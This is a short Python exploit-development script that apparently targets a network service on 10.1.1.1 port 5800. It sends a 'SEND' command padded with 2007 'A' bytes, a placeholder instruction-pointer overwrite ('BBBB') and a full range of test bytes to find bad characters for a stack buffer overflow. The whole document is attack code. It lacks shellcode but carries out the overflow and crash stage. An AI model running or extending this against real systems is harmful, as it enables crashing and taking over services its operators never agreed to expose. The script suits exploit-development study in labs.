import socket

IP = "10.1.1.1"
PORT = 5800

# stored bad chars
BAD = {0x00}

def generate_all_bytes(bad_set):
    return bytes(b for b in range(1, 256) if b not in bad_set)

if __name__ == "__main__":
    badchars = generate_all_bytes(BAD)

    eip = b"BBBB"
    payload = b"A" * 2007 + eip + badchars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    print("Sending payload...")
    s.sendall(b"SEND " + payload + b"\r\n")
    print(s.recv(1024))
    s.close()
